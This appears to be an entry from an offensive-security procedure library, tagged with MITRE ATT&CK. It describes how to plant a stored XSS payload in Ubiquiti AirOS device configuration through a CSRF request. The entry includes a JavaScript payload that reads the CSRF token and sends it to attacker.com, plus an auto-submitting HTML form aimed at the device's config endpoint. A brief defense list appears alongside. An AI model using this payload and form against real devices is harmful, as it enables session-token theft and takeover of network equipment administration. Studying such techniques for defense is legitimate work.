---
tags:
  - xss
  - stored-xss
  - csrf
  - airos
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:35.844Z'
sub_techniques: []
id: b37e79bb-356d-4691-a3e1-deb8948b04d1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-via-CSRF-Request

## Summary

This procedure uses a CSRF bypass to inject a stored XSS payload into the AirOS device configuration, enabling persistent script execution in authenticated sessions.

## Description

By exploiting the CSRF vulnerability, an attacker crafts a request to store unsanitized input (e.g., in location or notes fields) containing JavaScript. When admins view the config, the payload executes, facilitating further attacks like token theft. Targets AirOS 6.1.5+ on PowerBeam M5 300; requires user interaction via malicious page visit.

## Requirements

1. Prior CSRF bypass capability
2. Identified injectable fields in config endpoints
3. Attacker-controlled domain for hosting the exploit page

## Defense

Defensive measures and detection strategies:

- Sanitize all config inputs with output encoding
- Enable XSS filters and strict CSP headers
- Audit config changes for script-like content

## Objectives

1. Persist malicious JavaScript in device storage
2. Execute in admin context for privilege escalation
3. Enable chained exploits like CSRF bypass

## Instructions

### Step 1: Prepare XSS Payload

**Context**: Design a payload that evades basic filters and performs desired actions (e.g., token exfil).

Example payload: `<script>var t=document.querySelector('input[name=csrf_token]').value;fetch('http://attacker.com?token='+t);</script>`

### Step 2: Embed in CSRF Form

**Context**: Integrate the payload into a form submission targeting a config endpoint.

Host HTML:

```html
<form action="http://target-device-ip/cgi-bin/webproc" method="post">
<input type="hidden" name="payload_field" value="<script>/*payload here*/</script>">
</form>
<script>document.forms[0].submit();</script>
```

> Adjust 'payload_field' to match vulnerable param (e.g., sys_location).

### Step 3: Verify Injection

**Context**: Have user visit page; check if payload stores by accessing config UI.

Confirm execution via alert or exfil callback to attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[csrf]]
